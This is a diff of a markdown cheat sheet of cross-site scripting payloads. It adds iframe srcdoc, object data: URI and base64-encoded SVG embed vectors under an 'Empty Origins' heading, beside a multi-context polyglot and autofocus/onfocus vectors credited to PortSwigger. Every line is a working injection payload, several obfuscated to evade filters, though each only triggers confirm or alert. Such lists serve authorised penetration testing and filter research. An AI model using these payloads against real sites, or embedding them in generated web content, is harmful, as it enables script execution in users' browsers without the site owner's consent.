@@ -1,7 +1,9 @@
-#### For Editor
-<iframe srcdoc="<details/open/ontoggle=confir\u006d(location.href) style=display:none></details>"></iframe>
 #### polyglot
 javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+confirm(/testStr/)//'>
+#### Undefined Origins / Empty Origins
+✅<iframe srcdoc="For Editor <details/open/ontoggle=confir\u006d(location.href) style=display:none></details>"></iframe>
+✅<object data='data:text/html,<details/open/ontoggle=confir\u006d(location.href) style=display:none></details>'></object>
+✅<embed/src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSI5IiBoZWlnaHQ9IjkiPgogIDxhOnNjcmlwdCB4bWxuczphPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj5jb25maXJtKGRvY3VtZW50LmxvY2F0aW9uLmhyZWYpPC9hOnNjcmlwdD4KPC9zdmc+ICAg">
 #### https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <a autofocus onfocus=alert(1) href></a>
 <a autofocus onfocusin=alert(1) href></a>
